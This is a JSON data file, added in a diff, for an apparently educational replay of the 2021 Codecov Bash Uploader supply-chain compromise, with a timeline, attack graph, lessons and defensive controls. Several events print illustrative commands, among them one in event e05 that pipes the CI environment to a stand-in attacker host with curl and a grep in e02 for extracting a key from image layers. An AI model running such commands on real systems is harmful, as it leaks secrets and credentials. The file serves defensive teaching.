@@ -1,0 +1,142 @@
+{
+  "slug": "codecov-bash-uploader-2021",
+  "title": "A Credential in a Docker Image",
+  "subtitle": "The 2021 Codecov Bash Uploader supply-chain compromise",
+  "category": "Incident Replay",
+  "difficulty": "advanced",
+  "estimatedMinutes": 18,
+  "fictional": false,
+  "source": {
+    "label": "Codecov — Post-Mortem / Root Cause Analysis (April 2021)",
+    "url": "https://about.codecov.io/apr-2021-post-mortem/"
+  },
+  "disclaimer": "Educational reconstruction based on Codecov's published post-mortem and root cause analysis. This replay is event-counted rather than action-counted: the public record supports a sequence of events, not a per-step action tally. Dates come from the vendor's disclosure; the commands shown are representative illustrations of the documented techniques, not recovered artifacts.",
+  "summary": "This one runs backwards from most breaches: the victim organization was never the target. An attacker extracted a **credential that had been baked into a public Docker image**, used it to modify a script that thousands of CI pipelines download and execute on every build, and let those pipelines exfiltrate their own environment variables — AWS keys, deploy keys, API tokens, service-account credentials. The modification began **31 January 2021** and ran undetected until **1 April**, when a customer compared the script's checksum against the one published on GitHub and found they did not match. Every downstream organization was compromised by trusting a build tool. Press play, then switch to Defend mode.",
+  "stages": [
+    { "id": "stage-1", "name": "Poisoning the source", "note": "leaked credential to modified artifact" },
+    { "id": "stage-2", "name": "Downstream harvest", "note": "CI pipelines exfiltrate their own secrets" }
+  ],
+  "phases": [
+    { "id": "recon", "label": "recon", "note": "inspecting published container images" },
+    { "id": "cred-access", "label": "cred-access", "note": "extracting the baked-in key" },
+    { "id": "supply-chain", "label": "supply-chain", "note": "modifying the distributed artifact" },
+    { "id": "collection", "label": "collection", "note": "CI environment variables harvested" },
+    { "id": "exfil", "label": "exfil", "note": "secrets sent to attacker infrastructure" },
+    { "id": "detection", "label": "detection", "note": "customer checksum mismatch" }
+  ],
+  "nodes": [
+    { "id": "public-image", "stageId": "stage-1", "group": "Public registry", "label": "Public Docker image", "sub": "vendor-published · contains an HMAC key" },
+    { "id": "service-account", "stageId": "stage-1", "group": "Vendor cloud (GCP)", "label": "Service-account credential", "sub": "write access to the artifact bucket" },
+    { "id": "gcs-bucket", "stageId": "stage-1", "group": "Vendor cloud (GCP)", "label": "Artifact storage", "sub": "hosts the Bash Uploader script" },
+    { "id": "bash-uploader", "stageId": "stage-1", "group": "Vendor distribution", "label": "Bash Uploader script", "sub": "curl | bash on every build" },
+    { "id": "customer-ci", "stageId": "stage-2", "group": "Downstream customers · CI", "label": "Customer CI pipelines", "sub": "thousands of builds executing the script" },
+    { "id": "ci-secrets", "stageId": "stage-2", "group": "Downstream customers · CI", "label": "CI environment", "sub": "AWS keys · deploy keys · API tokens" },
+    { "id": "attacker-server", "stageId": "stage-2", "group": "Attacker infrastructure", "label": "Collection server", "sub": "receives exported environment" }
+  ],
+  "edges": [
+    { "from": "public-image", "to": "service-account", "label": "extract key" },
+    { "from": "service-account", "to": "gcs-bucket", "label": "write access" },
+    { "from": "gcs-bucket", "to": "bash-uploader", "label": "modify script" },
+    { "from": "bash-uploader", "to": "customer-ci", "label": "downloaded per build" },
+    { "from": "customer-ci", "to": "ci-secrets", "label": "read environment" },
+    { "from": "ci-secrets", "to": "attacker-server", "label": "exfiltrate" }
+  ],
+  "events": [
+    {
+      "id": "e01", "t": "2021-01-20T00:00:00Z", "phaseId": "recon", "stageId": "stage-1",
+      "title": "Inspecting a published container image", "blastRadius": "public registry", "ignites": ["public-image"],
+      "detail": "Container images are public artifacts with inspectable layer history. Anything present when a layer was built stays in that layer — deleting a file in a later step does not remove it from the image.",
+      "commands": ["docker pull <vendor>/<image>:<tag>", "docker history --no-trunc <vendor>/<image>:<tag>"]
+    },
+    {
+      "id": "e02", "t": "2021-01-25T00:00:00Z", "phaseId": "cred-access", "stageId": "stage-1",
+      "title": "Extracting the baked-in credential", "blastRadius": "vendor cloud", "ignites": ["service-account"],
+      "detail": "Codecov's root cause analysis attributes initial access to an error in their Docker image creation process, which allowed extraction of an HMAC key for a service account from a public image.",
+      "commands": ["docker save <image> | tar -xO | grep -aoE 'hmac[_-]?key[^\\\"]*'", "# service-account credential recovered from a layer"]
+    },
+    {
+      "id": "e03", "t": "2021-01-31T00:00:00Z", "phaseId": "supply-chain", "stageId": "stage-1",
+      "title": "The distributed script is modified", "blastRadius": "vendor distribution", "ignites": ["gcs-bucket", "bash-uploader"],
+      "detail": "The key grants write access to the Google Cloud Storage location serving the Bash Uploader. Beginning 31 January 2021 the script is periodically modified — the artifact millions of builds fetch is now attacker-controlled, while the copy on GitHub remains clean.",
+      "commands": ["# authenticate with the recovered service-account key", "# overwrite the hosted uploader with a modified copy"]
+    },
+    {
+      "id": "e04", "t": "2021-02-01T00:00:00Z", "phaseId": "collection", "stageId": "stage-2",
+      "title": "CI pipelines run the modified script", "blastRadius": "downstream CI", "ignites": ["customer-ci", "ci-secrets"],
+      "detail": "The uploader is designed to be fetched and piped straight into a shell on every build. Each pipeline that does so now executes the attacker's version — with whatever privileges the CI job holds.",
+      "commands": ["curl -s https://<vendor>/bash | bash", "# executes with full access to the job's environment"]
+    },
+    {
+      "id": "e05", "t": "2021-02-01T01:00:00Z", "phaseId": "exfil", "stageId": "stage-2",
+      "title": "Environment variables exported to the attacker", "blastRadius": "downstream credentials", "ignites": ["attacker-server"],
+      "detail": "The modification sends the CI environment to an attacker-controlled host. Codecov advised that exfiltrated information could include AWS IAM keys, deploy keys, API keys, service accounts, passwords, and authentication tokens — the keys to every system those pipelines could reach.",
+      "commands": ["env | curl -X POST --data-binary @- https://<attacker-host>/", "# repeated on every build, for two months"]
+    },
+    {
+      "id": "e06", "t": "2021-03-01T00:00:00Z", "phaseId": "exfil", "stageId": "stage-2",
+      "title": "Two months of quiet collection", "blastRadius": "downstream credentials",
+      "detail": "The script is modified periodically through February and March. Nothing about a build fetching its usual tool from its usual URL looks anomalous, so the collection continues unremarked.",
+      "commands": ["# steady-state credential collection across customer pipelines"]
+    },
+    {
+      "id": "e07", "t": "2021-04-01T00:00:00Z", "phaseId": "detection", "stageId": "stage-2",
+      "title": "A customer checks the checksum", "blastRadius": "vendor distribution",
+      "detail": "On 1 April 2021 a customer performing SHASUM verification notices that the SHA256 of the downloaded uploader does not match the value published on GitHub. Detection comes from a downstream user doing integrity checking the ecosystem had treated as optional.",
+      "commands": ["curl -s https://<vendor>/bash -o uploader.sh", "shasum -a 256 uploader.sh   # != the value published on GitHub"]
+    },
+    {
+      "id": "e08", "t": "2021-04-15T00:00:00Z", "phaseId": "detection", "stageId": "stage-2",
+      "title": "Disclosure and mass credential rotation", "blastRadius": "downstream credentials",
+      "detail": "Codecov remediates the script and discloses publicly in mid-April. Every affected organization has to treat all secrets exposed to its CI environment as compromised and rotate them — several publicly confirmed downstream impact.",
+      "commands": ["# rotate every credential reachable from CI", "# audit for unauthorized use of exposed keys"]
+    }
+  ],
+  "lessons": [
+    "Never bake credentials into container images. Image layers are immutable and public images are inspectable — a secret present during any build step is recoverable forever, regardless of whether a later step deletes it. Scan images for secrets in CI, the same way you scan source.",
+    "`curl | bash` is a standing grant of code execution to whoever controls that URL. If a build must fetch a script, pin it by digest and verify a signature or checksum before executing — the vendor published a SHA256 precisely so this could be caught, and one customer checking it is what ended the incident.",
+    "The credential that publishes your artifacts is a production secret. It deserves separation, rotation, and monitoring at the same level as your customer database, because it can reach every one of your customers at once.",
+    "CI environment variables are a credential store with no access control. Any code the pipeline runs can read all of them. Prefer short-lived, workload-scoped credentials (OIDC federation) over long-lived static keys, so a stolen environment expires quickly.",
+    "Your attack surface includes your suppliers' attack surface. None of the downstream victims were compromised through their own perimeter — they were compromised by a build tool they trusted. Inventory what your pipelines execute and where it comes from.",
+    "Integrity monitoring beats perimeter monitoring for supply-chain attacks. Nothing looked anomalous: a build fetched its normal tool from its normal URL. Only comparing the artifact against its expected hash exposed it.",
+    "Assume detection will be slow and plan the recovery. Two months of collection meant the response was mass credential rotation across many organizations. Knowing which secrets are exposed to CI, and being able to rotate them quickly, is the control that limits the damage."
+  ],
+  "defenderBudget": 2,
+  "controls": [
+    {
+      "id": "no-secrets-in-images",
+      "label": "Keep credentials out of container images",
+      "detail": "Use build-time secret mounts and scan published images for credentials. The attacker inspects the image and finds nothing usable — the chain never starts.",
+      "breaksAtNode": "service-account"
+    },
+    {
+      "id": "scoped-publish-identity",
+      "label": "Separate, least-privilege publishing identity",
+      "detail": "The credential that can write released artifacts should be isolated, short-lived, and monitored. A key recovered from an image can no longer overwrite the distributed script.",
+      "breaksAtNode": "gcs-bucket"
+    },
+    {
+      "id": "verify-artifact-integrity",
+      "label": "Pin and verify the artifact before executing",
+      "detail": "Pin by digest and check the published SHA256 (or a signature) before piping anything into a shell. The modified uploader fails verification, so pipelines never run it.",
+      "breaksAtNode": "customer-ci"
+    },
+    {
+      "id": "short-lived-ci-credentials",
+      "label": "Short-lived, workload-scoped CI credentials",
+      "detail": "Replace long-lived static keys in the CI environment with OIDC-federated, job-scoped credentials. The environment is still readable, but what it yields expires almost immediately.",
+      "breaksAtNode": "ci-secrets"
+    },
+    {
+      "id": "ci-egress-allowlist",
+      "label": "Restrict CI egress to an allowlist",
+      "detail": "Build jobs rarely need to POST to arbitrary hosts. Denying unknown egress destinations stops collected secrets from leaving even if everything upstream succeeds.",
+      "breaksAtNode": "attacker-server"
+    },
+    {
+      "id": "artifact-integrity-monitoring",
+      "label": "Continuous artifact-integrity monitoring",
+      "detail": "Automatically compare distributed artifacts against their expected hashes. It does not sever the chain, but it turns a two-month dwell time into same-day detection.",
+      "detection": true
+    }
+  ]
+}
